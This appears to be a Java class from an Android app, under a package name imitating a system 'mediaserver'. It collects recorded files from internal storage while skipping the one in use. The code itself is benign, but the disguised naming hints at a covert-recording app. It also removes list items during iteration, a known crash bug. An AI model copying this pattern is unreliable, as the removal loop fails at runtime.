package com.android.mediaserver.fetchers.media;

import android.content.Context;
import com.android.mediaserver.config.Config;
import com.android.mediaserver.file.FileLister;
import com.android.mediaserver.file.filefilter.TrueFileFilter;
import com.android.mediaserver.util.AppUtils;
import com.sromku.simple.storage.SimpleStorage;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;

public class RecordingsFetcher {
  private Context mContext;

  public RecordingsFetcher(Context context) {
    mContext = context;
  }

  public Collection<File> fetch() {
    File recordingDirectory = SimpleStorage.getInternalStorage(mContext)
        .getFile(Config.getInstance(mContext).getRecordingsDirectoryName());
    if (!recordingDirectory.exists()) {
      return new ArrayList();
    }
    Collection<File> listFiles =
        FileLister.listFiles(recordingDirectory, TrueFileFilter.TRUE, TrueFileFilter.TRUE);
    String usedFile = AppUtils.getUsedFile(mContext);
    if (usedFile.isEmpty()) {
      return listFiles;
    }
    for (File file : listFiles) {
      if (true == file.getAbsolutePath().contains(usedFile)) {
        listFiles.remove(file);
      }
    }
    return listFiles;
  }
}
